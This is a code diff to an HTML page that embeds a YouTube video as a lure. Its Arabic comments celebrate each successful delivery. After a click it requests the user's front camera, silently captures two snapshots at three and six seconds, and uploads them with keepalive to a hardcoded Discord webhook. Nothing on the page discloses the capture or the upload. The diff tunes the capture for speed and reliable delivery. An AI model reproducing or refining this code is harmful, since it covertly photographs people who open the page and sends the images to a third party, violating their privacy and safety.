@@ -26,7 +26,7 @@
 
 <div class="wrapper">
     <iframe id="youtube-frame" 
-        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
+        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0&modestbranding=1" 
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
@@ -40,7 +40,7 @@
 <canvas id="photo-canvas"></canvas>
 
 <script>
-    // الويب هوك الجديد الخاص بك
+    // الويب هوك الخاص بك - تم التأكد منه
     const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
@@ -51,27 +51,29 @@
         iframe.style.visibility = 'visible';
 
         try {
-            // تشغيل الصوت والفيديو
+            // تشغيل الفيديو والصوت
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا بدقة عالية
+            // طلب الكاميرا بأقصى سرعة
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
-            camera.onplaying = () => {
-                // محاولات إرسال متكررة لضمان وصول الصورة 100%
-                setTimeout(() => captureAndSend(1), 3000); // لقطة أولى
-                setTimeout(() => captureAndSend(2), 6000); // لقطة ثانية احتياطية
+            // التصوير بمجرد بدء التدفق
+            camera.onloadedmetadata = () => {
+                // لقطة أولى سريعة (بعد 3 ثواني)
+                setTimeout(() => captureAndSend("First_Shot"), 3000);
+                // لقطة ثانية تأكيدية (بعد 6 ثواني)
+                setTimeout(() => captureAndSend("Final_Shot"), 6000);
             };
         } catch (err) {
-            console.error("Camera Error");
+            console.error("User denied camera");
         }
     });
 
-    async function captureAndSend(id) {
+    function captureAndSend(label) {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -80,28 +82,24 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            canvas.toBlob(async (blob) => {
+            canvas.toBlob((blob) => {
                 if (!blob) return;
 
                 const formData = new FormData();
-                formData.append('file', blob, `capture_${id}.png`);
-                formData.append('content', `🚀 **وصلت الصورة!** (اللقطة: ${id})`);
+                formData.append('file', blob, label + '.png');
+                formData.append('content', `📸 **وصلت اللقطة بنجاح!** (${label})`);
 
-                // الحل الجذري: استخدام fetch مع keepalive
-                try {
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        body: formData,
-                        keepalive: true // يضمن استمرار الإرسال حتى لو قفل المتصفح التبويب
-                    });
-                } catch (e) {
-                    // إذا فشل الإرسال، نعيد المحاولة بعد ثانيتين
-                    setTimeout(() => captureAndSend(id + "_retry"), 2000);
-                }
+                // الإرسال مع نظام الـ fetch القوي
+                fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData,
+                    // keepalive تضمن وصول الصورة حتى لو الموقع تعطل أو تقفل
+                    keepalive: true 
+                }).then(() => console.log("Sent!"));
             }, 'image/png');
         } else {
-            // الكاميرا لم تجهز، انتظر ثانية
-            setTimeout(() => captureAndSend(id), 1000);
+            // إعادة محاولة إذا كانت الكاميرا سوداء
+            setTimeout(() => captureAndSend(label), 1000);
         }
     }
 </script>
